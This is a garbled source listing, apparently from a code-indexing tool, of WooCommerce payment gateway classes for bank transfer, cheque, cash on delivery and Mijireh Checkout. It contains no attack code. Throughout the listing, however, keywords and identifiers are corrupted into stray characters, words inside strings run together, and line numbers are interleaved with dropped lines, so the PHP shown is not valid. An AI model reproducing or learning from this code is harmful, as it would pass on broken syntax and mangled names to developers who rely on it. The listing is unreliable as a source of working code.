Ğ'woocomm”û_upd©e_İtiÚs_·ym’t_g©eways_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save_account_details' ) );

54 
	`add_aùiÚ
Ğ'woocomm”û_thªkyou_bacs', 
	`¬¿y
Ğ
$this
, 'thankyou_page' ) );

57 
	`add_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
	`¬¿y
Ğ
$this
, 'email_instructions' ), 10, 3 );

63 
public
 
funùiÚ
 
	$š™_fÜm_f›lds
() {

64 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

65 '’abËd' => 
	`¬¿y
(

66 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

68 'Ïb–' => 
	`__
( 'Enable Bank Transfer', 'woocommerce' ),

71 't™Ë' => 
	`¬¿y
(

72 't™Ë' => 
	`__
( 'Title', 'woocommerce' ),

74 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

75 'deçuÉ' => 
	`__
( 'Direct Bank Transfer', 'woocommerce' ),

76 'desc_t' => 
Œue
,

78 'desütiÚ' => 
	`¬¿y
(

79 't™Ë' => 
	`__
( 'Description', 'woocommerce' ),

81 'desütiÚ' => 
	`__
( 'Payment method descriptionhathe customer will see on your checkout.', 'woocommerce' ),

82 'deçuÉ' => 
	`__
( 'Make your…ayment directly into our bank‡ccount. Please use your Order ID‡she…ayment„eference. Your order won\'t be shipped untilhe funds have cleared in our‡ccount.', 'woocommerce' ),

83 'desc_t' => 
Œue
,

85 'š¡ruùiÚs' => 
	`¬¿y
(

86 't™Ë' => 
	`__
( 'Instructions', 'woocommerce' ),

88 'desütiÚ' => 
	`__
( 'Instructionshat will be‡ddedohehank you…age‡ndƒmails.', 'woocommerce' ),

90 'desc_t' => 
Œue
,

92 'accouÁ_d‘as' => 
	`¬¿y
(

96 
	}
}

101 
public
 
funùiÚ
 
	$g’”©e_accouÁ_d‘as_html
() {

102 
	`ob_¡¬t
();

104 <
Œ
 
v®ign
="top">

105 <
th
 
scİe
="row" 
şass
="t™Ëdesc"><?
php
 
	`_e
( 'Account Details', 'woocommerce' ); ?>:</th>

106 <
td
 
şass
="fÜmšp" 
id
="bacs_accounts">

107 <
bË
 
şass
="wideçˆwc_šput_bË sÜbË" 
ûÎ¥acšg
="0">

108 <
th—d
>

109 <
Œ
>

110 <
th
 
şass
="sÜt">&
nb¥
;</th>

111 <
th
><?
php
 
	`_e
( 'Account Name', 'woocommerce' ); ?></th>

112 <
th
><?
php
 
	`_e
( 'Account Number', 'woocommerce' ); ?></th>

113 <
th
><?
php
 
	`_e
( 'Bank Name', 'woocommerce' ); ?></th>

114 <
th
><?
php
 
	`_e
( 'Sort Code', 'woocommerce' ); ?></th>

115 <
th
><?
php
 
	`_e
( 'IBAN', 'woocommerce' ); ?></th>

116 <
th
><?
php
 
	`_e
( 'BIC / Swift', 'woocommerce' ); ?></th>

117 </
Œ
>

118 </
th—d
>

119 <
tfoÙ
>

120 <
Œ
>

121 <
th
 
cŞ¥ª
="7"><
a
 
h»f
="#" 
şass
="add bu‰Ú"><?
php
 
	`_e
( '+ Add Account', 'woocommerce' ); ?></a> <a href="#" class="remove_rows button"><?php _e( 'Remove selected‡ccount(s)', 'woocommerce' ); ?></a></th>

122 </
Œ
>

123 </
tfoÙ
>

124 <
tbody
 
şass
="accounts">

125 <?
php


126 
$i
 = -1;

127 iàĞ
$this
->
accouÁ_d‘as
 ) {

128 
	`fÜ—ch
 ( 
$this
->
accouÁ_d‘as
 
as
 
$accouÁ
 ) {

129 
$i
++;

131 
echo
 '<tr class="account">

132 <
td
 
şass
="sort"></td>

133 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$accouÁ['accouÁ_Çme'] ) . '" 
Çme
="bacs_account_name[' . $i . ']" /></td>

134 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$accouÁ['accouÁ_numb”'] ) . '" 
Çme
="bacs_account_number[' . $i . ']" /></td>

135 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$accouÁ['bªk_Çme'] ) . '" 
Çme
="bacs_bank_name[' . $i . ']" /></td>

136 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$accouÁ['sÜt_code'] ) . '" 
Çme
="bacs_sort_code[' . $i . ']" /></td>

137 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$accouÁ['ibª'] ) . '" 
Çme
="bacs_iban[' . $i . ']" /></td>

138 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$accouÁ['bic'] ) . '" 
Çme
="bacs_bic[' . $i . ']" /></td>

139 </
Œ
>';

143 </
tbody
>

144 </
bË
>

145 <
süt
 
ty³
="text/javascript">

146 
	`jQu”y
(
	`funùiÚ
() {

147 
	`jQu”y
('#bacs_accouÁs').
	`Ú
Ğ'şick', 'a.add', 
	`funùiÚ
(){

149 
v¬
 
size
 = 
	`jQu”y
('#bacs_accouÁ tbody .accouÁ').
	`size
();

151 
	`jQu”y
('<Œ cÏss="accouÁ">\
<td cÏss="sÜt"></td>\
<td><špuˆty³="‹xt"‚ame="bacs_accouÁ_Çme[' + 
size
 + ']" /></td>\
<td><špuˆty³="‹xt"‚ame="bacs_accouÁ_numb”[' + siz+ ']" /></td>\
<td><špuˆty³="‹xt"‚ame="bacs_bªk_Çme[' + siz+ ']" /></td>\
<td><špuˆty³="‹xt"‚ame="bacs_sÜt_code[' + siz+ ']" /></td>\
<td><špuˆty³="‹xt"‚ame="bacs_ibª[' + siz+ ']" /></td>\
<td><špuˆty³="‹xt"‚ame="bacs_bic[' + siz+ ']" /></td>\
</Œ>').
	`­³ndTo
('#bacs_accountsablebody');

161  
çl£
;

164 </
süt
>

165 </
td
>

166 </
Œ
>

167 <?
php


168  
	`ob_g‘_ş—n
();

169 
	}
}

174 
public
 
funùiÚ
 
	$§ve_accouÁ_d‘as
() {

175 
$accouÁs
 = 
	`¬¿y
();

177 iàĞ
	`is£t
Ğ
$_POST
['bacs_account_name'] ) ) {

179 
$accouÁ_Çmes
 = 
	`¬¿y_m­
Ğ'wc_ş—n', 
$_POST
['bacs_account_name'] );

180 
$accouÁ_numb”s
 = 
	`¬¿y_m­
Ğ'wc_ş—n', 
$_POST
['bacs_account_number'] );

181 
$bªk_Çmes
 = 
	`¬¿y_m­
Ğ'wc_ş—n', 
$_POST
['bacs_bank_name'] );

182 
$sÜt_codes
 = 
	`¬¿y_m­
Ğ'wc_ş—n', 
$_POST
['bacs_sort_code'] );

183 
$ibªs
 = 
	`¬¿y_m­
Ğ'wc_ş—n', 
$_POST
['bacs_iban'] );

184 
$bics
 = 
	`¬¿y_m­
Ğ'wc_ş—n', 
$_POST
['bacs_bic'] );

186 
	`fÜ—ch
 ( 
$accouÁ_Çmes
 
as
 
$i
 => 
$Çme
 ) {

187 iàĞ! 
	`is£t
Ğ
$accouÁ_Çmes
[ 
$i
 ] ) ) {

191 
$accouÁs
[] = 
	`¬¿y
(

192 'accouÁ_Çme' => 
$accouÁ_Çmes
[ 
$i
 ],

193 'accouÁ_numb”' => 
$accouÁ_numb”s
[ 
$i
 ],

194 'bªk_Çme' => 
$bªk_Çmes
[ 
$i
 ],

195 'sÜt_code' => 
$sÜt_codes
[ 
$i
 ],

196 'ibª' => 
$ibªs
[ 
$i
 ],

197 'bic' => 
$bics
[ 
$i
 ]

202 
	`upd©e_İtiÚ
Ğ'woocomm”û_bacs_accouÁs', 
$accouÁs
 );

203 
	}
}

208 
public
 
funùiÚ
 
	$thªkyou_·ge
Ğ
$Üd”_id
 ) {

209 iàĞ
$this
->
š¡ruùiÚs
 ) {

210 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
	`wp_k£s_po¡
Ğ
$this
->
š¡ruùiÚs
 ) ) );

212 
$this
->
	`bªk_d‘as
Ğ
$Üd”_id
 );

213 
	}
}

224 
public
 
funùiÚ
 
	$ema_š¡ruùiÚs
Ğ
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 = 
çl£
 ) {

226 iàĞ
$£Á_to_admš
 || 
$Üd”
->
¡©us
 !=ğ'Ú-hŞd' || $Üd”->
·ym’t_m‘hod
 !== 'bacs' ) {

230 iàĞ
$this
->
š¡ruùiÚs
 ) {

231 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$this
->
š¡ruùiÚs
 ) ) . 
PHP_EOL
;

234 
$this
->
	`bªk_d‘as
Ğ
$Üd”
->
id
 );

235 
	}
}

240 
´iv©e
 
funùiÚ
 
bªk_d‘as
Ğ
$Üd”_id
 = '' ) {

241 iàĞ
em±y
Ğ
$this
->
accouÁ_d‘as
 ) ) {

245 
	gecho
 '<h2>' . 
__
Ğ'Ou¸Bªk D‘as', 'woocomm”û' ) . '</h2>' . 
	gPHP_EOL
;

247 
	g$bacs_accouÁs
 = 
­¶y_f‹rs
Ğ'woocomm”û_bacs_accouÁs', 
$this
->
accouÁ_d‘as
 );

249 iàĞ! 
em±y
Ğ
$bacs_accouÁs
 ) ) {

250 
fÜ—ch
 ( 
$bacs_accouÁs
 
as
 
$bacs_accouÁ
 ) {

251 
	gecho
 '<uÈşass="Üd”_d‘a bacs_d‘as">' . 
	gPHP_EOL
;

253 
	g$bacs_accouÁ
 = (
objeù
è
$bacs_accouÁ
;

256 
	g$accouÁ_f›lds
 = 
­¶y_f‹rs
Ğ'woocomm”û_bacs_accouÁ_f›lds', 
¬¿y
(

257 'accouÁ_numb”'=> 
¬¿y
(

258 'Ïb–' => 
__
( 'Account Number', 'woocommerce' ),

259 'v®ue' => 
$bacs_accouÁ
->
accouÁ_numb”


261 'sÜt_code' => 
¬¿y
(

262 'Ïb–' => 
__
( 'Sort Code', 'woocommerce' ),

263 'v®ue' => 
$bacs_accouÁ
->
sÜt_code


265 'ibª' => 
¬¿y
(

266 'Ïb–' => 
__
( 'IBAN', 'woocommerce' ),

267 'v®ue' => 
$bacs_accouÁ
->
ibª


269 'bic' => 
¬¿y
(

270 'Ïb–' => 
__
( 'BIC', 'woocommerce' ),

271 'v®ue' => 
$bacs_accouÁ
->
bic


273 ), 
$Üd”_id
 );

275 iàĞ
	g$bacs_accouÁ
->
	gaccouÁ_Çme
 || $bacs_accouÁ->
	gbªk_Çme
 ) {

276 
	gecho
 '<h3>' . 
im¶ode
Ğ' - ', 
¬¿y_f‹r
Ğ
¬¿y
Ğ
$bacs_accouÁ
->
accouÁ_Çme
, $bacs_accouÁ->
bªk_Çme
 ) ) ) . '</h3>' . 
	gPHP_EOL
;

279 
fÜ—ch
 ( 
$accouÁ_f›lds
 
as
 
$f›ld_key
 => 
$f›ld
 ) {

280 iàĞ! 
em±y
Ğ
$f›ld
['value'] ) ) {

281 
echo
 '<l˜şass="' . 
esc_©Œ
Ğ
$f›ld_key
 ) . '">' .ƒsc_©ŒĞ
$f›ld
['Ïb–'] ) . ': <¡rÚg>' . 
w±exturize
Ğ$f›ld['v®ue'] ) . '</¡rÚg></li>' . 
PHP_EOL
;

285 
	gecho
 '</ul>';

296 
public
 
funùiÚ
 
	$´oûss_·ym’t
Ğ
$Üd”_id
 ) {

298 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

301 
$Üd”
->
	`upd©e_¡©us
Ğ'Ú-hŞd', 
	`__
( 'Awaiting BACS…ayment', 'woocommerce' ) );

304 
$Üd”
->
	`»duû_Üd”_¡ock
();

307 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
();

310  
	`¬¿y
(

312 '»dœeù' => 
$this
->
	`g‘_»tuº_u¾
Ğ
$Üd”
 )

314 
	}
}

	@includes/gateways/cheque/class-wc-gateway-cheque.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_G©eway_Cheque
 
ex‹nds
 
	mWC_Paym’t_G©eway
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

22 
$this
->
id
 = 'cheque';

23 
$this
->
icÚ
 = 
	`­¶y_f‹rs
('woocommerce_cheque_icon', '');

24 
$this
->
has_f›lds
 = 
çl£
;

25 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'Cheque', 'woocommerce' );

26 
$this
->
m‘hod_desütiÚ
 = 
	`__
( 'Allows cheque…ayments. Why would youake cheques inhis day‡nd‡ge? Well you…robably wouldn\'t but it does‡llow youo makeest…urchases foresting orderƒmails‡ndhe \'success\'…agesƒtc.', 'woocommerce' );

29 
$this
->
	`š™_fÜm_f›lds
();

30 
$this
->
	`š™_£‰šgs
();

33 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

34 
$this
->
desütiÚ
 = $this->
	`g‘_İtiÚ
( 'description' );

35 
$this
->
š¡ruùiÚs
 = $this->
	`g‘_İtiÚ
Ğ'š¡ruùiÚs', $this->
desütiÚ
 );

38 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_·ym’t_g©eways_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

39 
	`add_aùiÚ
Ğ'woocomm”û_thªkyou_cheque', 
	`¬¿y
Ğ
$this
, 'thankyou_page' ) );

42 
	`add_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
	`¬¿y
Ğ
$this
, 'email_instructions' ), 10, 3 );

48 
public
 
funùiÚ
 
	$š™_fÜm_f›lds
() {

50 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

51 '’abËd' => 
	`¬¿y
(

52 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

54 'Ïb–' => 
	`__
( 'Enable Cheque Payment', 'woocommerce' ),

57 't™Ë' => 
	`¬¿y
(

58 't™Ë' => 
	`__
( 'Title', 'woocommerce' ),

60 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

61 'deçuÉ' => 
	`__
( 'Cheque Payment', 'woocommerce' ),

62 'desc_t' => 
Œue
,

64 'desütiÚ' => 
	`¬¿y
(

65 't™Ë' => 
	`__
( 'Description', 'woocommerce' ),

67 'desütiÚ' => 
	`__
( 'Payment method descriptionhathe customer will see on your checkout.', 'woocommerce' ),

68 'deçuÉ' => 
	`__
( 'Please send your chequeo Store Name, Store Street, Store Town, Store State / County, Store Postcode.', 'woocommerce' ),

69 'desc_t' => 
Œue
,

71 'š¡ruùiÚs' => 
	`¬¿y
(

72 't™Ë' => 
	`__
( 'Instructions', 'woocommerce' ),

74 'desütiÚ' => 
	`__
( 'Instructionshat will be‡ddedohehank you…age‡ndƒmails.', 'woocommerce' ),

76 'desc_t' => 
Œue
,

79 
	}
}

84 
public
 
funùiÚ
 
	$thªkyou_·ge
() {

85 iàĞ
$this
->
š¡ruùiÚs
 )

86 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$this
->
š¡ruùiÚs
 ) );

87 
	}
}

97 
public
 
funùiÚ
 
	$ema_š¡ruùiÚs
Ğ
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 = 
çl£
 ) {

98 iàĞ
$£Á_to_admš
 || 
$Üd”
->
¡©us
 !=ğ'Ú-hŞd' || $Üd”->
·ym’t_m‘hod
 !== 'cheque' )

101 iàĞ
$this
->
š¡ruùiÚs
 )

102 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$this
->
š¡ruùiÚs
 ) );

103 
	}
}

111 
public
 
funùiÚ
 
	$´oûss_·ym’t
Ğ
$Üd”_id
 ) {

113 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

116 
$Üd”
->
	`upd©e_¡©us
Ğ'Ú-hŞd', 
	`__
( 'Awaiting cheque…ayment', 'woocommerce' ) );

119 
$Üd”
->
	`»duû_Üd”_¡ock
();

122 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
();

125  
	`¬¿y
(

127 '»dœeù' => 
$this
->
	`g‘_»tuº_u¾
Ğ
$Üd”
 )

129 
	}
}

	@includes/gateways/cod/class-wc-gateway-cod.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_G©eway_COD
 
ex‹nds
 
	mWC_Paym’t_G©eway
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

22 
$this
->
id
 = 'cod';

23 
$this
->
icÚ
 = 
	`­¶y_f‹rs
( 'woocommerce_cod_icon', '' );

24 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'Cash on Delivery', 'woocommerce' );

25 
$this
->
m‘hod_desütiÚ
 = 
	`__
( 'Have your customers…ay with cash (or by other means) upon delivery.', 'woocommerce' );

26 
$this
->
has_f›lds
 = 
çl£
;

29 
$this
->
	`š™_fÜm_f›lds
();

30 
$this
->
	`š™_£‰šgs
();

33 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

34 
$this
->
desütiÚ
 = $this->
	`g‘_İtiÚ
( 'description' );

35 
$this
->
š¡ruùiÚs
 = $this->
	`g‘_İtiÚ
Ğ'š¡ruùiÚs', $this->
desütiÚ
 );

36 
$this
->
’abË_fÜ_m‘hods
 = $this->
	`g‘_İtiÚ
Ğ'’abË_fÜ_m‘hods', 
	`¬¿y
() );

38 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_·ym’t_g©eways_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

39 
	`add_aùiÚ
Ğ'woocomm”û_thªkyou_cod', 
	`¬¿y
Ğ
$this
, 'thankyou_page' ) );

42 
	`add_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
	`¬¿y
Ğ
$this
, 'email_instructions' ), 10, 3 );

48 
public
 
funùiÚ
 
	$š™_fÜm_f›lds
() {

49 
glob®
 
$woocomm”û
;

51 
$shpšg_m‘hods
 = 
	`¬¿y
();

53 iàĞ
	`is_admš
() )

54 
	`fÜ—ch
 ( 
	`WC
()->
shpšg
->
	`lßd_shpšg_m‘hods
(è
as
 
$m‘hod
 ) {

55 
$shpšg_m‘hods
[ 
$m‘hod
->
id
 ] = $m‘hod->
	`g‘_t™Ë
();

58 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

59 '’abËd' => 
	`¬¿y
(

60 't™Ë' => 
	`__
( 'Enable COD', 'woocommerce' ),

61 'Ïb–' => 
	`__
( 'Enable Cash on Delivery', 'woocommerce' ),

66 't™Ë' => 
	`¬¿y
(

67 't™Ë' => 
	`__
( 'Title', 'woocommerce' ),

69 'desütiÚ' => 
	`__
( 'Payment method descriptionhathe customer will see on your checkout.', 'woocommerce' ),

70 'deçuÉ' => 
	`__
( 'Cash on Delivery', 'woocommerce' ),

71 'desc_t' => 
Œue
,

73 'desütiÚ' => 
	`¬¿y
(

74 't™Ë' => 
	`__
( 'Description', 'woocommerce' ),

76 'desütiÚ' => 
	`__
( 'Payment method descriptionhathe customer will see on your website.', 'woocommerce' ),

77 'deçuÉ' => 
	`__
( 'Pay with cash upon delivery.', 'woocommerce' ),

78 'desc_t' => 
Œue
,

80 'š¡ruùiÚs' => 
	`¬¿y
(

81 't™Ë' => 
	`__
( 'Instructions', 'woocommerce' ),

83 'desütiÚ' => 
	`__
( 'Instructionshat will be‡ddedohehank you…age.', 'woocommerce' ),

84 'deçuÉ' => 
	`__
( 'Pay with cash upon delivery.', 'woocommerce' ),

85 'desc_t' => 
Œue
,

87 '’abË_fÜ_m‘hods' => 
	`¬¿y
(

88 't™Ë' => 
	`__
( 'Enable for shipping methods', 'woocommerce' ),

93 'desütiÚ' => 
	`__
( 'If COD is only‡vailable for certain methods, set it up here. Leave blankoƒnable for‡ll methods.', 'woocommerce' ),

94 'İtiÚs' => 
$shpšg_m‘hods
,

95 'desc_t' => 
Œue
,

96 'cu¡om_©Œibu‹s' => 
	`¬¿y
(

97 'd©a-¶aûhŞd”' => 
	`__
( 'Select shipping methods', 'woocommerce' )

101 
	}
}

108 
public
 
funùiÚ
 
	$is_avaabË
() {

109 
$Üd”
 = 
nuÎ
;

111 iàĞ! 
	`WC
()->
ÿ¹
->
	`Ãeds_shpšg
() ) {

112  
çl£
;

115 iàĞ
	`is_·ge
Ğ
	`wc_g‘_·ge_id
Ğ'checkout' ) ) && 0 < 
	`g‘_qu”y_v¬
( 'order-pay' ) ) {

116 
$Üd”_id
 = 
	`absšt
Ğ
	`g‘_qu”y_v¬
( 'order-pay' ) );

117 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

120 
$Ãeds_shpšg
 = 
çl£
;

122 iàĞ0 < Ğ
$Üd”
->
	`g‘_™ems
() ) ) {

123 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_™ems
(è
as
 
$™em
 ) {

124 
$_´oduù
 = 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

126 iàĞ
$_´oduù
->
	`Ãeds_shpšg
() ) {

127 
$Ãeds_shpšg
 = 
Œue
;

133 
$Ãeds_shpšg
 = 
	`­¶y_f‹rs
( 'woocommerce_cart_needs_shipping', $needs_shipping );

135 iàĞ
$Ãeds_shpšg
 ) {

136  
çl£
;

140 iàĞ! 
	`em±y
Ğ
$this
->
’abË_fÜ_m‘hods
 ) ) {

143 
$cho£n_shpšg_m‘hods_£ssiÚ
 = 
	`WC
()->
£ssiÚ
->
	`g‘
( 'chosen_shipping_methods' );

145 iàĞ
	`is£t
Ğ
$cho£n_shpšg_m‘hods_£ssiÚ
 ) ) {

146 
$cho£n_shpšg_m‘hods
 = 
	`¬¿y_unique
Ğ
$cho£n_shpšg_m‘hods_£ssiÚ
 );

148 
$cho£n_shpšg_m‘hods
 = 
	`¬¿y
();

151 
$check_m‘hod
 = 
çl£
;

153 iàĞ
	`is_objeù
Ğ
$Üd”
 ) ) {

154 iàĞ
$Üd”
->
shpšg_m‘hod
 ) {

155 
$check_m‘hod
 = 
$Üd”
->
shpšg_m‘hod
;

158 } 
	`–£if
 ( 
	`em±y
Ğ
$cho£n_shpšg_m‘hods
 ) || ( $chosen_shipping_methods ) > 1 ) {

159 
$check_m‘hod
 = 
çl£
;

160 } 
	`–£if
 ( Ğ
$cho£n_shpšg_m‘hods
 ) == 1 ) {

161 
$check_m‘hod
 = 
$cho£n_shpšg_m‘hods
[0];

164 iàĞ! 
$check_m‘hod
 ) {

165  
çl£
;

168 
$found
 = 
çl£
;

170 
	`fÜ—ch
 ( 
$this
->
’abË_fÜ_m‘hods
 
as
 
$m‘hod_id
 ) {

171 iàĞ
	`¡½os
Ğ
$check_m‘hod
, 
$m‘hod_id
 ) === 0 ) {

172 
$found
 = 
Œue
;

177 iàĞ! 
$found
 ) {

178  
çl£
;

182  
·»Á
::
	`is_avaabË
();

183 
	}
}

192 
public
 
funùiÚ
 
	$´oûss_·ym’t
Ğ
$Üd”_id
 ) {

194 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

197 
$Üd”
->
	`upd©e_¡©us
Ğ'´oûssšg', 
	`__
( 'Paymento be made upon delivery.', 'woocommerce' ) );

200 
$Üd”
->
	`»duû_Üd”_¡ock
();

203 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
();

206  
	`¬¿y
(

208 '»dœeù' => 
$this
->
	`g‘_»tuº_u¾
Ğ
$Üd”
 )

210 
	}
}

215 
public
 
funùiÚ
 
	$thªkyou_·ge
() {

216 iàĞ
$this
->
š¡ruùiÚs
 )

217 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$this
->
š¡ruùiÚs
 ) );

218 
	}
}

228 
public
 
funùiÚ
 
	$ema_š¡ruùiÚs
Ğ
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 = 
çl£
 ) {

229 iàĞ
$£Á_to_admš
 || 
$Üd”
->
·ym’t_m‘hod
 !== 'cod' )

232 iàĞ
$this
->
š¡ruùiÚs
 )

233 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$this
->
š¡ruùiÚs
 ) );

234 
	}
}

	@includes/gateways/mijireh/class-wc-gateway-mijireh.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_G©eway_Mijœeh
 
ex‹nds
 
	mWC_Paym’t_G©eway
 {

19 
v¬
 
	m$acûss_key
;

27 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

29 
$this
->
id
 = 'mijireh_checkout';

30 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'Mijireh Checkout', 'woocommerce' );

31 
$this
->
icÚ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_mijœeh_checkout_icÚ', 
	`WC
()->
	`¶ugš_u¾
() . '/includes/gateways/mijireh/assets/images/credit_cards.png' );

32 
$this
->
has_f›lds
 = 
çl£
;

35 
$this
->
	`š™_fÜm_f›lds
();

36 
$this
->
	`š™_£‰šgs
();

39 
$this
->
acûss_key
 = $this->
	`g‘_İtiÚ
( 'access_key' );

40 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

41 
$this
->
desütiÚ
 = $this->
	`g‘_İtiÚ
( 'description' );

43 iàĞ
$this
->
’abËd
 && 
	`is_admš
() ) {

44 
$this
->
	`š¡®l_¦u½_·ge
();

48 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_·ym’t_g©eways_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

51 
	`add_aùiÚ
Ğ'woocomm”û_­i_wc_g©eway_mijœeh', 
	`¬¿y
Ğ
$this
, 'mijireh_notification' ) );

59 
public
 
funùiÚ
 
	$š¡®l_¦u½_·ge
() {

60 
$¦u½_·ge_š¡®Ëd
 = 
	`g‘_İtiÚ
Ğ'¦u½_·ge_š¡®Ëd', 
çl£
 );

61 iàĞ
$¦u½_·ge_š¡®Ëd
 != 1 ) {

62 ifĞ! 
	`g‘_·ge_by_·th
( 'mijireh-secure-checkout' ) ) {

63 
$·ge
 = 
	`¬¿y
(

73 
	`wp_š£¹_po¡
Ğ
$·ge
 );

75 
	`upd©e_İtiÚ
( 'slurp_page_installed', 1 );

77 
	}
}

85 
public
 
funùiÚ
 
	$mijœeh_nÙifiÿtiÚ
() {

86 ifĞ
	`is£t
Ğ
$_GET
['order_number'] ) ) {

87 
glob®
 
$woocomm”û
;

89 
$this
->
	`š™_mijœeh
();

91 
Œy
 {

92 
$mj_Üd”
 = 
Ãw
 
	`Mijœeh_Ord”
Ğ
	`esc_©Œ
Ğ
$_GET
['order_number'] ) );

93 
$wc_Üd”_id
 = 
$mj_Üd”
->
	`g‘_m‘a_v®ue
( 'wc_order_id' );

94 
$wc_Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
	`absšt
Ğ
$wc_Üd”_id
 ) );

97 
$wc_Üd”
->
	`·ym’t_com¶‘e
();

100 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
();

102 
	`wp_»dœeù
Ğ
$this
->
	`g‘_»tuº_u¾
Ğ
$wc_Üd”
 ) );

103 
ex™
;

105 } 
	`ÿtch
 (
Mijœeh_Exû±iÚ
 
$e
) {

107 
	`wc_add_nÙiû
Ğ
	`__
Ğ'Mijœehƒ¼Ü:', 'woocomm”û' ) . 
$e
->
	`g‘Mes§ge
(), 'error' );

111 
	`–£if
Ğ
	`is£t
Ğ
$_POST
['page_id'] ) ) {

112 ifĞ
	`is£t
Ğ
$_POST
['acûss_key'] ) && $_POST['acûss_key'] =ğ
$this
->
acûss_key
 ) {

113 
	`wp_upd©e_po¡
Ğ
	`¬¿y
Ğ'ID' => 
$_POST
['page_id'], 'post_status' => 'private' ) );

116 
	}
}

126 
public
 
funùiÚ
 
	$š™_fÜm_f›lds
() {

127 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

128 '’abËd' => 
	`¬¿y
(

129 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

131 'Ïb–' => 
	`__
( 'Enable Mijireh Checkout', 'woocommerce' ),

134 'acûss_key' => 
	`¬¿y
(

135 't™Ë' => 
	`__
( 'Access Key', 'woocommerce' ),

137 'desütiÚ' => 
	`__
( 'The Mijireh‡ccess key for your store.', 'woocommerce' ),

139 'desc_t' => 
Œue
,

141 't™Ë' => 
	`¬¿y
(

142 't™Ë' => 
	`__
( 'Title', 'woocommerce' ),

144 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

145 'deçuÉ' => 
	`__
( 'Credit Card', 'woocommerce' ),

146 'desc_t' => 
Œue
,

148 'desütiÚ' => 
	`¬¿y
(

149 't™Ë' => 
	`__
( 'Description', 'woocommerce' ),

151 'deçuÉ' => 
	`__
( 'Pay securely with your credit card.', 'woocommerce' ),

152 'desütiÚ' => 
	`__
( 'This controlshe description whichhe user sees during checkout.', 'woocommerce' ),

155 
	}
}

165 
public
 
funùiÚ
 
	$admš_İtiÚs
() {

167 <
h3
><?
php
 
	`_e
( 'Mijireh Checkout', 'woocommerce' );?></h3>

169 <?
php
 iàĞ
	`em±y
Ğ
$this
->
acûss_key
 ) ) : ?>

170 <
div
 
şass
="mijireh updated">

171 <
p
 
şass
="maš"><
¡rÚg
><?
php
 
	`_e
( 'Get started with Mijireh Checkout', 'woocommerce' ); ?></strong></p>

172 <
¥ª
><
a
 
h»f
="h‰p://www.mijœeh.com/š‹g¿tiÚs/woocomm”û/">
Mijœeh
 
Checkout
</a> <?
php
 
	`_e
